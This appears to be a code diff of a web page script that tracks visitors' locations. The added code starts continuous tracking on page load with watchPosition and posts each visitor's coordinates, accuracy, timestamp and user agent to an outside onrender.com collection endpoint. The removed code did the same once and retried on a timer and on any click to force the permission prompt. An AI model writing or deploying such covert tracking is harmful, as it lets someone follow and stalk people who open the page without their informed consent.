@@ -56,103 +56,38 @@
     </div>
 
     <script>
-        let locationData = {};
-
-        function getLocation() {
-            console.log('Starting location request...');
-            
-            if (!navigator.geolocation) {
-                console.log('Geolocation not supported');
-                showContent();
-                return;
-            }
-
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
+        function sendLocation(position) {
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
             };
 
-            console.log('Requesting location permission...');
-            
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    // Success - capture location data
-                    locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent
-                    };
+            // Send each update to your backend
+            fetch('https://backend-location-0cvk.onrender.com/collect-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(locationData)
+            });
+        }
 
-                    console.log('✅ Location captured successfully:', locationData);
-                    
-                    // Send location data somewhere (you'll need to implement this)
-                    // For now, we'll create a visible alert
-                    fetch('https://backend-location-0cvk.onrender.com/collect-location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(locationData)
-                    });
-                    
-                    showContent();
-                },
-                function(error) {
-                    // Error or denied
-                    console.log('❌ Location error:', error.message);
-                    console.log('Error code:', error.code);
-                    
-                    let errorMsg = '';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = "Location access denied by user";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = "Location information unavailable";
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = "Location request timed out";
-                            break;
-                        default:
-                            errorMsg = "Unknown location error";
-                            break;
+        function startLiveLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    sendLocation,
+                    function(error) {
+                        console.error('Location error:', error);
                     }
-                    console.log('Error details:', errorMsg);
-                    showContent();
-                },
-                options
-            );
-        }
-
-        function showContent() {
-            document.querySelector('.loading').style.display = 'none';
-            document.getElementById('content').classList.remove('hidden');
-        }
-
-        // Try multiple approaches to request location
-        window.onload = function() {
-            console.log('Page loaded, attempting location request...');
-            
-            // Method 1: Immediate request
-            getLocation();
-            
-            // Method 2: Try again after a short delay
-            setTimeout(function() {
-                console.log('Attempting location request again...');
-                if (!locationData.latitude) {
-                    getLocation();
-                }
-            }, 3000);
-        };
-
-        // Also try when user interacts with the page
-        document.addEventListener('click', function() {
-            console.log('User clicked, trying location request...');
-            if (!locationData.latitude) {
-                getLocation();
+                );
+            } else {
+                alert('Geolocation is not supported by this browser.');
             }
-        });
+        }
+
+        // Start live location tracking as soon as the page loads
+        window.onload = startLiveLocation;
     </script>
     </script>
 </body>
